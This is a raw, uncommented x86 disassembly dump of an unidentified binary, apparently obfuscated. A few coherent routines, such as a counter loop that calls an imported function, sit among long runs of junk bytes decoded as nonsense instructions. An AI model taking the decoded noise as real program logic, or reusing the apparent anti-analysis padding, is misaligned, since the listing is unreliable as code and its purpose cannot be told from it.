  40cd76:	sahf   
  40cd77:	lods   eax,DWORD PTR ds:[si]
  40cd79:	mov    ecx,0x50ac958d
  40cd7e:	addr16 inc eax
  40cd80:	nop
  40cd81:	scas   eax,DWORD PTR es:[edi]
  40cd82:	jns    0x40cd62
  40cd84:	mov    esp,0x6eb6fef7
  40cd89:	mov    cl,0x7c
  40cd8b:	push   esp
  40cd8c:	lods   al,BYTE PTR fs:[esi]
  40cd8e:	ins    BYTE PTR es:[edi],dx
  40cd8f:	jl     0x40cdad
  40cd91:	(bad)  
  40cd92:	shl    BYTE PTR [eax],0x27
  40cd95:	daa    
  40cd96:	mov    ch,0xaf
  40cd98:	sbb    DWORD PTR [ebx*2-0x1270dd3b],0x65
  40cda0:	imul   edx,DWORD PTR [ecx-0x76],0xaba99934
  40cda7:	xchg   esp,eax
  40cda8:	push   bp
  40cdaa:	push   0xffffffeb
  40cdac:	into   
  40cdad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cdae:	push   ds
  40cdaf:	push   eax
  40cdb0:	xchg   ebp,eax
  40cdb1:	jl     0x40ce08
  40cdb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cdb4:	es jg  0x40cd3a
  40cdb7:	inc    esi
  40cdb8:	adc    DWORD PTR [ecx],ebx
  40cdba:	pop    edx
  40cdbb:	mov    BYTE PTR [edi+0x70],ah
  40cdbe:	sub    al,0x39
  40cdc0:	into   
  40cdc1:	add    al,BYTE PTR [edx+ebp*2+0x32]
  40cdc5:	test   eax,0x3698bc3e
  40cdca:	mov    BYTE PTR [edx],dh
  40cdcc:	mov    ebp,0x342f928f
  40cdd1:	bound  ecx,QWORD PTR [ebp+0x2dda0bc1]
  40cdd7:	dec    ebx
  40cdd8:	(bad)  
  40cdd9:	sub    BYTE PTR [edi-0x21398236],al
  40cddf:	jecxz  0x40cdb5
  40cde1:	mov    edi,0x907bfa62
  40cde6:	and    BYTE PTR [ecx-0x30],0xae
  40cdea:	adc    BYTE PTR [ebx+0x1d],dh
  40cded:	loopne 0x40cd8f
  40cdef:	adc    DWORD PTR [esi-0x59ffe477],ecx
  40cdf5:	out    dx,eax
  40cdf6:	test   DWORD PTR [edx-0x66],esp
  40cdf9:	les    ecx,FWORD PTR [ebx+0x3f2639d9]
  40cdff:	sbb    ah,0x9f
  40ce02:	pop    ebp
  40ce03:	fadd   st(3),st
  40ce05:	ss push esi
  40ce07:	in     al,0x81
  40ce09:	add    al,0xa6
  40ce0b:	add    DWORD PTR [esi-0x2e],esi
  40ce0e:	adc    bl,0x6f
  40ce11:	xor    DWORD PTR [ecx+ebp*4+0x1da2140e],esp
  40ce18:	push   eax
  40ce19:	das    
  40ce1a:	(bad)  
  40ce1b:	fisubr DWORD PTR [esi-0x7d393037]
  40ce21:	fcomp  DWORD PTR [eax+eiz*2-0x1f02e898]
  40ce28:	mov    eax,ds:0xdb6a449b
  40ce2d:	mov    DWORD PTR [edi-0x5febc7d],esi
  40ce33:	scas   eax,DWORD PTR es:[edi]
  40ce34:	sub    esi,edi
  40ce36:	retf   
  40ce37:	shl    BYTE PTR [edx],0x99
  40ce3a:	enter  0x2e5,0x53
  40ce3e:	xor    eax,0x3aae6c51
  40ce43:	call   DWORD PTR [eax]
  40ce45:	jbe    0x40cebe
  40ce47:	mov    esi,0xc4418ee
  40ce4c:	in     al,dx
  40ce4d:	xlat   BYTE PTR ds:[ebx]
  40ce4e:	mov    ds:0x9c4188ef,ax
  40ce54:	jne    0x40ceaf
  40ce56:	ja     0x40ce36
  40ce58:	inc    ebx
  40ce59:	push   ebp
  40ce5a:	push   ebp
  40ce5b:	in     eax,dx
  40ce5c:	xchg   BYTE PTR [edx+0x14],bl
  40ce5f:	dec    ecx
  40ce60:	adc    ebp,DWORD PTR [esi-0x4d]
  40ce63:	jnp    0x40cee2
  40ce65:	xchg   esp,eax
  40ce66:	mov    WORD PTR [esi+0x12],fs
  40ce69:	rcl    DWORD PTR [ebp+ebp*2-0x3d050708],1
  40ce70:	dec    edx
  40ce71:	cmp    eax,0x2317725b
  40ce76:	inc    ecx
  40ce77:	and    bh,ah
  40ce79:	mov    bh,0xae
  40ce7b:	inc    edi
  40ce7c:	(bad)  
  40ce7d:	in     eax,0xb9
  40ce7f:	arpl   WORD PTR [edi+edi*1-0x8c6820e],si
  40ce86:	enter  0xd909,0x62
  40ce8a:	sbb    eax,DWORD PTR [edi+ebp*4+0x79]
  40ce8e:	test   eax,0xe8c0cbce
  40ce93:	stc    
  40ce94:	mov    dl,0x1b
  40ce96:	jge    0x40ceec
  40ce98:	ficom  DWORD PTR [eax]
  40ce9a:	inc    ecx
  40ce9b:	sub    BYTE PTR [ebx-0x2a],dh
  40ce9e:	dec    ecx
  40ce9f:	je     0x40cee1
  40cea1:	sbb    edx,DWORD PTR [ebp+0x3b35c90e]
  40cea7:	iret   
  40cea8:	and    DWORD PTR [esi-0x8060c3d],esi
  40ceae:	aad    0x9e
  40ceb0:	xchg   DWORD PTR gs:[ebx],edx
  40ceb3:	add    DWORD PTR [ebp+0x6eaa081f],esp
  40ceb9:	popf   
  40ceba:	icebp  
  40cebb:	xor    DWORD PTR [edx-0x3b],esi
  40cebe:	sbb    eax,0x2e7e0172
  40cec3:	jno    0x40cf11
  40cec5:	dec    edx
  40cec6:	fistp  DWORD PTR [ecx-0x734fb336]
  40cecc:	fisttp QWORD PTR [eax+0x37]
  40cecf:	xchg   ebx,eax
  40ced0:	addr16 mov ebx,cs
  40ced3:	lock popa 
  40ced5:	cwde   
  40ced6:	push   esi
  40ced7:	mov    DWORD PTR [esi+0x6c99e53b],ebx
  40cedd:	cmp    al,0x67
  40cedf:	in     eax,dx
  40cee0:	mov    al,ds:0xe584c038
  40cee5:	int    0xbe
  40cee7:	lds    ebp,FWORD PTR [ebp-0x102b75d5]
  40ceed:	rep stos DWORD PTR es:[edi],eax
  40ceef:	xchg   edi,eax
  40cef0:	dec    ecx
  40cef1:	adc    DWORD PTR [edi+eiz*8-0x24],esp
  40cef5:	or     al,0x40
  40cef7:	xchg   edx,eax
  40cef8:	add    dh,ch
  40cefa:	repnz and eax,0xac74c709
  40cf00:	(bad)  
  40cf01:	jns    0x40cf19
  40cf03:	(bad)  
  40cf04:	pushf  
  40cf05:	cmp    BYTE PTR [esi+0x19],bl
  40cf08:	jnp    0x40cf77
  40cf0a:	push   0xffffff89
  40cf0c:	sub    al,0x9d
  40cf0e:	repnz out dx,eax
  40cf10:	dec    ebx
  40cf11:	cmp    bl,BYTE PTR [edx+0x2269a9d6]
  40cf17:	add    BYTE PTR [ebx-0x507ba26d],bl
  40cf1d:	add    DWORD PTR [eax-0x20],esp
  40cf20:	fcomp  QWORD PTR [ebp+0x3b23c63c]
  40cf26:	in     eax,0xdf
  40cf28:	rcl    ebp,0x4a
  40cf2b:	fucomi st,st(0)
  40cf2d:	inc    eax
  40cf2e:	fsubr  DWORD PTR [edx+0x72]
  40cf31:	cs dec esi
  40cf33:	inc    edi
  40cf34:	push   eax
  40cf35:	popf   
  40cf36:	iret   
  40cf37:	not    al
  40cf39:	cmp    ecx,DWORD PTR [eax-0x29]
  40cf3c:	mov    edi,eax
  40cf3e:	pop    ebx
  40cf3f:	fistp  QWORD PTR [ecx]
  40cf41:	in     eax,dx
  40cf42:	addr16 addr16 adc eax,0x7861e779
  40cf49:	push   eax
  40cf4a:	jge    0x40cecd
  40cf4c:	fnstcw WORD PTR [ebp-0x273fa26]
  40cf52:	sub    DWORD PTR [edx],ebx
  40cf54:	xchg   esp,eax
  40cf55:	jp     0x40cfca
  40cf57:	mov    eax,0xe51230da
  40cf5c:	mov    ebp,0xabb2c837
  40cf61:	add    dl,BYTE PTR [ebx-0x12f356cf]
  40cf67:	sbb    al,0x3c
  40cf69:	jg     0x40cf3b
  40cf6b:	fucom  st(7)
  40cf6d:	outs   dx,BYTE PTR ds:[esi]
  40cf6e:	adc    cl,ch
  40cf70:	inc    ecx
  40cf71:	xchg   BYTE PTR [edi],ah
  40cf73:	xchg   esp,eax
  40cf74:	push   cs
  40cf75:	adc    al,0xa2
  40cf77:	das    
  40cf78:	fisttp WORD PTR [edi-0x411e1726]
  40cf7e:	je     0x40cf74
  40cf80:	pop    ebp
  40cf81:	test   al,0x90
  40cf83:	pop    eax
  40cf84:	loope  0x40cfb5
  40cf86:	test   eax,0x11f917ed
  40cf8b:	addr16 je 0x40b5e7
  40cf92:	mov    eax,0x800f1c81
  40cf97:	jmp    0x40b5ee
  40cf9c:	push   ebp
  40cf9d:	mov    ebp,esp
  40cf9f:	sub    esp,0x60
  40cfa2:	sbb    DWORD PTR ds:0x42a845,0x18d1
  40cfac:	mov    eax,DWORD PTR [ebp+0x8]
  40cfaf:	xor    DWORD PTR ds:0x42a879,0x42a75d
  40cfb9:	jmp    0x40d211
  40cfbe:	ror    esp,1
  40cfc0:	mov    dh,0xc5
  40cfc3:	fcmovbe st,st(1)
  40cfc5:	(bad)  [esi]
  40cfc7:	push   ds
  40cfc8:	aad    0x62
  40cfca:	pop    ebx
  40cfcb:	in     eax,0xc1
  40cfcd:	retf   
  40cfce:	sub    ah,BYTE PTR [edi+0x7e357878]
  40cfd4:	js     0x40d04e
  40cfd6:	rol    BYTE PTR [eax],cl
  40cfd8:	lods   eax,DWORD PTR ds:[esi]
  40cfd9:	(bad)  
  40cfda:	cs rcl esi,0xa5
  40cfde:	inc    esi
  40cfdf:	cld    
  40cfe0:	pop    ecx
  40cfe1:	mov    ebp,0x5b077476
  40cfe6:	pop    ss
  40cfe7:	inc    edx
  40cfe8:	test   eax,0xf273ebcb
  40cfed:	mov    bl,0x8b
  40cfef:	inc    eax
  40cff0:	scas   eax,DWORD PTR es:[edi]
  40cff1:	fild   WORD PTR [ecx]
  40cff3:	call   0xff0a:0xd2d4e74
  40cffa:	sub    al,0x25
  40cffc:	xchg   edi,eax
  40cffd:	jl     0x40cff1
  40cfff:	retf   
  40d000:	in     eax,0x9d
  40d002:	push   ds
  40d003:	xor    al,0xc1
  40d005:	mov    ds:0xaa280982,eax
  40d00a:	pop    ebp
  40d00b:	test   DWORD PTR [eax+0x3e28d912],esi
  40d011:	mov    esi,0x5be669eb
  40d016:	scas   eax,DWORD PTR es:[edi]
  40d017:	loope  0x40d018
  40d019:	popf   
  40d01a:	daa    
  40d01b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d01c:	repz pop es
  40d01e:	xchg   ebp,ebx
  40d020:	int3   
  40d021:	in     al,dx
  40d022:	pop    ds
  40d023:	push   ds
  40d024:	imul   eax,DWORD PTR [ebx],0x3c
  40d027:	bound  edx,QWORD PTR [edi+0x64782160]
  40d02d:	and    BYTE PTR [eax],ch
  40d02f:	lahf   
  40d030:	adc    BYTE PTR ds:0xa50cd5be,bl
  40d036:	or     bh,al
  40d038:	and    ecx,DWORD PTR [eax]
  40d03a:	mov    DWORD PTR [ebx+0x7957638f],ebx
  40d040:	mov    ch,BYTE PTR [ebp+0x6a]
  40d043:	mov    ch,0xa0
  40d045:	cmp    edi,DWORD PTR [ebx+0xc3ba52d]
  40d04b:	pop    ebp
  40d04c:	push   es
  40d04d:	xor    esp,DWORD PTR [ecx+0x60]
  40d050:	loope  0x40d00b
  40d052:	adc    dh,BYTE PTR [esi+0x18]
  40d055:	cmp    al,0x98
  40d057:	mov    bl,0xc6
  40d059:	shl    BYTE PTR ds:0xbacba87b,1
  40d05f:	iret   
  40d060:	ret    0xbc13
  40d063:	ja     0x40d05d
  40d065:	pop    ds
  40d066:	jge    0x40d059
  40d068:	push   eax
  40d069:	sbb    eax,0x13e9244e
  40d06e:	lods   al,BYTE PTR ds:[esi]
  40d06f:	dec    esp
  40d070:	mov    BYTE PTR [ebx+eax*2+0x6332489],dh
  40d077:	push   0xd26a959f
  40d07c:	loopne 0x40d097
  40d07e:	pop    edi
  40d07f:	std    
  40d080:	shl    BYTE PTR [edx+0x208a28d9],cl
  40d086:	ret    0xbaf4
  40d089:	ss jnp 0x40d01e
  40d08c:	jo     0x40d06e
  40d08e:	fcomip st,st(7)
  40d090:	rcr    DWORD PTR [esi+0x782d29cd],0x8
  40d097:	aad    0xc7
  40d099:	add    al,0x73
  40d09b:	mov    ds:0x264387e3,eax
  40d0a0:	mov    ds:0x93e7921a,eax
  40d0a5:	adc    dh,BYTE PTR [ecx]
  40d0a7:	mov    ds:0xc851e131,eax
  40d0ac:	aad    0x46
  40d0ae:	hlt    
  40d0af:	out    dx,eax
  40d0b0:	mov    eax,ds:0x75c8afc2
  40d0b5:	push   ss
  40d0b6:	sub    BYTE PTR [edx],dl
  40d0b8:	xchg   esi,eax
  40d0b9:	jecxz  0x40d0bb
  40d0bb:	cmp    DWORD PTR [ecx+ebx*4+0x4d],esi
  40d0bf:	cmc    
  40d0c0:	add    eax,0x5a932ba4
  40d0c5:	test   BYTE PTR [edi+0x2f4629ed],dh
  40d0cb:	fcomp  DWORD PTR [ebx+esi*8]
  40d0ce:	aas    
  40d0cf:	inc    esi
  40d0d0:	mov    eax,ds:0x2d578a11
  40d0d5:	scas   al,BYTE PTR es:[edi]
  40d0d6:	nop
  40d0d7:	stos   DWORD PTR es:[di],eax
  40d0d9:	adc    bh,BYTE PTR [ecx]
  40d0db:	xor    BYTE PTR [edi],al
  40d0dd:	outs   dx,DWORD PTR ds:[esi]
  40d0de:	or     DWORD PTR [esi+eax*8-0x583c3d1d],0x7b3e4679
  40d0e9:	mov    esi,0x91233870
  40d0ee:	cmp    BYTE PTR [ebp-0x49],dh
  40d0f1:	pusha  
  40d0f2:	fpatan 
  40d0f4:	shr    bl,cl
  40d0f6:	sub    al,0x99
  40d0f8:	push   cs
  40d0f9:	xor    esp,ecx
  40d0fb:	daa    
  40d0fc:	or     ah,dh
  40d0fe:	or     ch,BYTE PTR [ecx-0x13]
  40d101:	sbb    BYTE PTR [esi+0x46],bh
  40d104:	mov    ch,0x49
  40d106:	call   0xa397:0xa4eefd6e
  40d10d:	leave  
  40d10e:	(bad)  
  40d110:	mov    eax,0xbd83ff9e
  40d115:	div    DWORD PTR [ebp-0x40108dd5]
  40d11b:	jg     0x40d09e
  40d11d:	push   eax
  40d11e:	lea    eax,[edx]
  40d120:	push   0x34
  40d122:	sbb    ch,BYTE PTR [edx-0x59]
  40d125:	mov    ebp,0xc93d6c33
  40d12a:	loopne 0x40d19c
  40d12c:	push   edx
  40d12d:	jmp    0x40d19a
  40d12f:	xchg   ebp,eax
  40d130:	jp     0x40d198
  40d132:	arpl   WORD PTR [esi+0x3da1028b],bp
  40d138:	pop    esi
  40d139:	pop    ss
  40d13a:	inc    eax
  40d13b:	test   BYTE PTR [ebp+0x25bc6fd9],0xef
  40d142:	inc    esp
  40d143:	or     BYTE PTR [esp+ecx*8+0x1d51a016],ch
  40d14a:	cs mov esi,0x6bfdf197
  40d150:	loope  0x40d122
  40d152:	fldenv [edi+0x60]
  40d155:	or     dh,bh
  40d157:	pop    esp
  40d158:	data16 xchg BYTE PTR [esi+ebx*4],cl
  40d15c:	es pop ecx
  40d15e:	xor    DWORD PTR [ebp+0x7a],0x4d
  40d162:	pop    ebx
  40d163:	and    eax,0xf9d106ab
  40d168:	and    ecx,0xffffffce
  40d16b:	lea    edx,ds:0x79e0d420
  40d171:	xchg   DWORD PTR [edx+0x5fa0ca1],esi
  40d177:	aas    
  40d178:	sub    edi,DWORD PTR ds:0xd3f616b0
  40d17e:	sub    al,0x73
  40d180:	hlt    
  40d181:	add    ecx,DWORD PTR [esp+eiz*4]
  40d184:	sar    BYTE PTR ds:0xb8647ffb,0x40
  40d18c:	or     ch,cl
  40d18e:	or     BYTE PTR [eax],ah
  40d190:	clc    
  40d191:	cmp    BYTE PTR [edi],dh
  40d193:	inc    eax
  40d194:	sti    
  40d195:	inc    ebx
  40d196:	and    dl,BYTE PTR [edi]
  40d198:	push   ebp
  40d199:	sub    DWORD PTR [ebx-0x7f],eax
  40d19c:	sub    ebp,DWORD PTR [esi-0x5f]
  40d19f:	dec    ebp
  40d1a0:	test   eax,0x8270c596
  40d1a5:	and    esi,DWORD PTR [esi+0x5e]
  40d1a8:	pusha  
  40d1a9:	(bad)  
  40d1aa:	rcr    dl,0x83
  40d1ad:	mov    ch,0xdb
  40d1af:	(bad)  [ecx]
  40d1b1:	call   DWORD PTR [ecx+edx*2]
  40d1b4:	(bad)
  40d1b8:	fsub   st(5),st
  40d1ba:	adc    ch,BYTE PTR fs:[esi-0x4eb30551]
  40d1c1:	jae    0x40d17f
  40d1c3:	jmp    0x40d22d
  40d1c5:	mov    al,0x7a
  40d1c7:	and    ebp,DWORD PTR [edx+ecx*1-0x7e]
  40d1cb:	sbb    BYTE PTR [ebp-0x32ab2d9a],0xa3
  40d1d2:	out    0xf6,eax
  40d1d4:	gs push esp
  40d1d6:	dec    ebp
  40d1d7:	retf   0xb7e
  40d1da:	inc    esi
  40d1db:	repnz push ds
  40d1dd:	dec    edi
  40d1de:	dec    edx
  40d1df:	jmp    0x40d204
  40d1e1:	push   ebp
  40d1e2:	mov    esi,0x9b1da645
  40d1e7:	outs   dx,BYTE PTR ds:[esi]
  40d1e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1e9:	adc    ch,dh
  40d1eb:	enter  0x5826,0x84
  40d1ef:	and    eax,0xbc9692fb
  40d1f4:	push   eax
  40d1f5:	inc    ebx
  40d1f6:	push   ebp
  40d1f7:	imul   eax,DWORD PTR [edi-0x162e57a6],0x70247e2e
  40d201:	mov    ds,WORD PTR [ebp+0x48]
  40d204:	mov    esp,DWORD PTR [esi+edx*1+0x57]
  40d208:	gs inc edx
  40d20a:	push   cs
  40d20b:	jno    0x40d265
  40d20d:	xchg   esi,eax
  40d20e:	mov    dl,0xc9
  40d210:	sti    
  40d211:	push   ebx
  40d212:	push   esi
  40d213:	and    DWORD PTR ds:0x42a7b5,0x0
  40d21d:	jmp    0x40d22f
  40d222:	mov    ebx,DWORD PTR ds:0x42a7b5
  40d228:	inc    ebx
  40d229:	mov    DWORD PTR ds:0x42a7b5,ebx
  40d22f:	cmp    DWORD PTR ds:0x42a7b5,0x1d
  40d236:	jae    0x40d254
  40d23c:	cmp    DWORD PTR ds:0x42a7b5,0x26
  40d243:	jne    0x40d24f
  40d249:	call   DWORD PTR ds:0x41d24c
  40d24f:	jmp    0x40d222
  40d254:	mov    esi,0x7510850
  40d259:	movzx  ebx,WORD PTR ds:0x42a775
  40d260:	xor    ebx,DWORD PTR ds:0x42a75d
  40d266:	mov    DWORD PTR ds:0x42a775,ebx
  40d26c:	xor    eax,esi
  40d26e:	or     ebx,0x7ad4
  40d274:	mov    ebx,0x327298
  40d279:	adc    DWORD PTR ds:0x42a7bd,0x42a879
  40d283:	add    eax,ebx
  40d285:	sub    DWORD PTR ds:0x42a889,0x2a37
  40d28f:	push   edi
  40d290:	mov    DWORD PTR [ebp-0x18],eax
  40d293:	adc    DWORD PTR ds:0x42a879,0x18
  40d29d:	mov    edi,DWORD PTR [ebp+0x8]
  40d2a0:	neg    DWORD PTR ds:0x42a845
  40d2a6:	xor    edi,esi
  40d2a8:	jmp    0x40d500
  40d2ad:	int    0xca
  40d2af:	iret   
  40d2b0:	retf   0xd9db
  40d2b3:	(bad)  
  40d2b5:	and    ah,ah
  40d2b7:	push   ecx
  40d2b8:	pusha  
  40d2b9:	lock call FWORD PTR [esi+0x78a5e71a]
  40d2c0:	js     0x40d2f7
  40d2c2:	jle    0x40d33c
  40d2c4:	js     0x40d32d
  40d2c6:	lahf   
  40d2c7:	aaa    
  40d2c8:	aas    
  40d2c9:	cmp    al,BYTE PTR [ecx]
  40d2cb:	cmp    al,bh
  40d2cd:	mul    DWORD PTR [ebp+0x5e]
  40d2d0:	out    0xfc,al
  40d2d2:	out    dx,eax
  40d2d3:	out    0xf2,eax
  40d2d5:	lea    eax,[ebp-0x3951f2da]
  40d2db:	popf   
  40d2dc:	stc    
  40d2dd:	pop    ecx
  40d2de:	in     al,0xee
  40d2e0:	addr16 loopne 0x40d312
  40d2e3:	icebp  
  40d2e4:	hlt    
  40d2e5:	pop    ecx
  40d2e6:	push   0xffffffd7
  40d2e8:	fnstenv ss:[edx-0x1076863d]
  40d2ef:	lods   eax,DWORD PTR ds:[esi]
  40d2f0:	call   0x7def6cc9
  40d2f5:	adc    ebx,esp
  40d2f7:	add    ah,BYTE PTR [ecx]
  40d2f9:	cmp    al,0x67
  40d2fb:	push   0xffffffae
  40d2fd:	mov    esi,0x4423a49d
  40d302:	dec    ebx
  40d303:	mov    al,ds:0x667cae87
  40d308:	add    ebx,edx
  40d30a:	std    
  40d30b:	inc    esp
  40d30c:	lds    ebx,FWORD PTR cs:[eax+ecx*8+0x6ef00077]
  40d314:	jle    0x40d37b
  40d316:	pop    DWORD PTR [edx-0x30]
  40d319:	or     edx,esi
  40d31b:	inc    ebp
  40d31c:	fidivr DWORD PTR [ebp+0x0]
  40d31f:	test   cl,al
  40d321:	fcmovu st,st(3)
  40d323:	mov    dh,0xb9
  40d325:	adc    eax,0xb0ed3f71
  40d32a:	(bad)  
  40d32b:	call   0x36ffbd8e
  40d330:	sub    BYTE PTR [edi],cl
  40d332:	xchg   edi,eax
  40d333:	xchg   esp,eax
  40d334:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d335:	or     cl,al
  40d337:	sbb    eax,0xb7cf21b
  40d33c:	or     DWORD PTR [esi+0x49178bc1],esi
  40d342:	in     al,0x9
  40d344:	test   eax,0x147ebca
  40d349:	icebp  
  40d34a:	aaa    
  40d34b:	lds    esi,FWORD PTR [ecx]
  40d34d:	jne    0x40d2f1
  40d34f:	and    ch,BYTE PTR [ecx+0x4b]
  40d352:	inc    esp
  40d353:	ja     0x40d3a3
  40d355:	cld    
  40d356:	mov    ebx,0xeedc49e4
  40d35b:	loopne 0x40d3bc
  40d35d:	fs dec ebp
  40d35f:	nop
  40d360:	shr    ah,cl
  40d362:	call   0x2269b3a8
  40d367:	jmp    0x6fcd0c88
  40d36c:	pusha  
  40d36d:	or     BYTE PTR [edx+0x51],al
  40d370:	xchg   ebp,eax
  40d371:	call   0xe3bea9cf
  40d376:	jns    0x40d32b
  40d378:	dec    eax
  40d379:	in     eax,dx
  40d37a:	cmc    
  40d37b:	inc    edx
  40d37c:	sbb    ah,BYTE PTR [eax+0x15]
  40d37f:	and    BYTE PTR [ebp+0x14],ah
  40d382:	xchg   edx,eax
  40d383:	lahf   
  40d384:	pop    es
  40d385:	pusha  
  40d386:	ret    0xd45d
  40d389:	add    al,BYTE PTR [eax-0x4d]
  40d38c:	adc    bl,ch
  40d38e:	clc    
  40d38f:	inc    esp
  40d390:	fisttp WORD PTR [edi]
  40d392:	into   
  40d393:	sub    bl,BYTE PTR [eax-0x482ace29]
  40d399:	stos   DWORD PTR es:[edi],eax
  40d39a:	loopne 0x40d3a4
  40d39c:	mov    DWORD PTR [ebp+0x2a96f01e],edi
  40d3a2:	std    
  40d3a3:	mov    ah,0x6e
  40d3a5:	xor    al,0xf3
  40d3a7:	xchg   ecx,eax
  40d3a8:	jns    0x40d381
  40d3aa:	outs   dx,BYTE PTR ds:[esi]
  40d3ab:	or     cl,BYTE PTR [ebx+0x4da461c0]
  40d3b1:	mov    dh,al
  40d3b3:	aad    0x32
  40d3b5:	pop    ebx
  40d3b6:	sub    al,BYTE PTR [edx+0x30]
  40d3b9:	pop    edx
  40d3ba:	enter  0x8894,0x6f
  40d3be:	fucomip st,st(5)
  40d3c0:	loope  0x40d3c5
  40d3c2:	cdq    
  40d3c3:	or     BYTE PTR [edx-0x4d7a6775],0x3f
  40d3ca:	mov    eax,ds:0x76c180ae
  40d3cf:	inc    esi
  40d3d0:	or     edx,DWORD PTR [esi+0x50]
  40d3d3:	jle    0x40d373
  40d3d5:	mov    ebp,0xaf765f25
  40d3da:	sub    eax,0x75921dc2
  40d3df:	and    ebx,DWORD PTR [edx+0xf]
  40d3e2:	out    0x30,al
  40d3e4:	adc    cl,BYTE PTR [esp+ebx*1]
  40d3e7:	pop    ebp
  40d3e8:	xchg   DWORD PTR [eax],edx
  40d3ea:	pop    es
  40d3eb:	fcomp  QWORD PTR [esi]
  40d3ed:	cld    
  40d3ee:	int    0x4b
  40d3f0:	xchg   BYTE PTR [ecx+0x341ed464],ch
  40d3f6:	lods   eax,DWORD PTR ds:[esi]
  40d3f7:	jbe    0x40d419
  40d3f9:	les    edx,FWORD PTR [edi-0x307b9bec]
  40d3ff:	inc    esi
  40d400:	ret    0xe286
  40d403:	pop    ss
  40d404:	imul   edi,DWORD PTR [eax+0x33],0xffffff96
  40d408:	push   edi
  40d409:	cmc    
  40d40a:	bswap  ebx
  40d40c:	or     dl,BYTE PTR [ecx-0x3]
  40d40f:	mov    ch,0xbd
  40d411:	and    al,0xe2
  40d413:	sbb    BYTE PTR [edx+eiz*8],bl
  40d416:	aad    0x9f
  40d418:	ss jne 0x40d480
  40d41b:	xor    ebx,esi
  40d41d:	jle    0x40d3bc
  40d41f:	test   DWORD PTR [edi-0x1dce45e],ecx
  40d425:	adc    al,0xdb
  40d427:	enter  0xe22,0x25
  40d42b:	int3   
  40d42c:	push   ebx
  40d42d:	pop    ebp
  40d42e:	scas   eax,DWORD PTR es:[edi]
  40d42f:	repz inc edx
  40d431:	dec    DWORD PTR [ecx]
  40d433:	int    0x30
  40d435:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d436:	retf   
  40d437:	aam    0xbb
  40d439:	mov    al,ds:0x31e0e57
  40d43e:	into   
  40d43f:	into   
  40d440:	repnz loopne 0x40d418
  40d443:	in     al,0x65
  40d445:	mov    cl,0x8d
  40d447:	loopne 0x40d49f
  40d449:	stos   BYTE PTR es:[edi],al
  40d44a:	sub    ch,BYTE PTR [eax+0x41a03607]
  40d450:	ror    BYTE PTR [esi-0xa],0x5d
  40d454:	xchg   ecx,eax
  40d455:	mov    eax,0x2b5b4f5e
  40d45a:	cli    
  40d45b:	mov    eax,0xd6206159
  40d460:	or     dl,BYTE PTR [eax]
  40d462:	into   
  40d463:	xor    ah,al
  40d465:	mov    bl,0x1
  40d467:	je     0x40d4a9
  40d469:	pusha  
  40d46a:	ss push ds
  40d46c:	rol    DWORD PTR [ebx-0x70b18634],1
  40d472:	gs dec esp
  40d474:	sub    edi,eax
  40d476:	fistp  WORD PTR [ebp-0x178f4436]
  40d47c:	add    bl,BYTE PTR [esp+esi*8-0x27]
  40d480:	jp     0x40d439
  40d482:	jl     0x40d438
  40d484:	call   0xea32db8
  40d489:	add    esi,DWORD PTR [ecx+0x64]
  40d48c:	rol    eax,1
  40d48e:	push   0x15265dcf
  40d493:	fisttp DWORD PTR ds:0xe12e978c
  40d499:	xor    edi,DWORD PTR [esi+0x59]
  40d49c:	inc    ebp
  40d49d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d49e:	push   edx
  40d49f:	call   0xe099:0x12689962
  40d4a6:	mov    dh,0xcf
  40d4a8:	pop    edx
  40d4a9:	scas   al,BYTE PTR es:[edi]
  40d4aa:	ins    DWORD PTR es:[edi],dx
  40d4ab:	jmp    0xa2dc:0xc9a8af3f
  40d4b2:	lea    ecx,[edi-0x47]
  40d4b5:	jl     0x40d43d
  40d4b7:	rol    ecx,0xa7
  40d4ba:	and    al,0x82
  40d4bc:	push   ecx
  40d4bd:	ror    BYTE PTR [esi+0x3fe6ed40],1
  40d4c3:	jb     0x40d4da
  40d4c5:	jl     0x40d544
  40d4c7:	dec    ecx
  40d4c8:	outs   dx,BYTE PTR ds:[esi]
  40d4c9:	call   0x6507:0xaa498efa
  40d4d0:	dec    edx
  40d4d1:	cmp    cl,BYTE PTR ds:0xd0bcca42
  40d4d7:	rcl    BYTE PTR [ebx-0x1c],cl
  40d4da:	idiv   ch
  40d4dc:	je     0x40d53b
  40d4de:	mov    ch,0xa4
  40d4e0:	xchg   ebp,eax
  40d4e1:	sub    BYTE PTR [ebp+esi*1+0x1e2a79ed],bh
  40d4e8:	sub    esi,ebx
  40d4ea:	ja     0x40d4ce
  40d4ec:	cli    
  40d4ed:	mov    ecx,0xc558a69a
  40d4f2:	pushf  
  40d4f3:	enter  0x6e48,0x11
  40d4f7:	dec    esp
  40d4f8:	add    eax,0x5b397405
  40d4fd:	jle    0x40d55e
  40d4ff:	mov    dl,0xc7
  40d501:	inc    ebp
  40d502:	hlt    
  40d503:	clc    
  40d504:	test   DWORD PTR [eax+edi*8+0x38f045c7],ebx
  40d50b:	xchg   DWORD PTR [eax+edi*8-0x580ada7f],ebx
  40d512:	inc    edx
  40d513:	add    BYTE PTR ds:0x30042a8,al
  40d519:	sti    
  40d51a:	jmp    0x40e985
  40d51f:	cmp    edi,0x3f
  40d522:	jne    0x40d55a
  40d528:	mov    eax,0x337e
  40d52d:	mov    eax,ds:0x41e966
  40d532:	mov    eax,DWORD PTR [eax]
  40d534:	mov    DWORD PTR [ebp-0x14],eax
  40d537:	mov    eax,ds:0x41eb6e
  40d53c:	mov    DWORD PTR ds:0x42a769,0x45db
  40d546:	mov    eax,DWORD PTR [eax]
  40d548:	mov    DWORD PTR [ebp-0x18],eax
  40d54b:	mov    DWORD PTR ds:0x42a7cd,0x1d30
  40d555:	jmp    0x40e979
  40d55a:	mov    DWORD PTR ds:0x42a835,0x19ca
  40d564:	jmp    0x40d7bc
  40d569:	leave  
  40d56a:	ret    
  40d56b:	enter  0xd6c6,0xd9
  40d56f:	fld    st(3)
  40d571:	int    0x93
  40d573:	fdiv   st,st(0)
  40d575:	push   0x71
  40d577:	mov    ah,0x39
  40d579:	pushf  
  40d57a:	stos   DWORD PTR es:[edi],eax
  40d57b:	js     0x40d5f5
  40d57d:	xor    eax,0x4478787e
  40d582:	cmp    al,0x9d
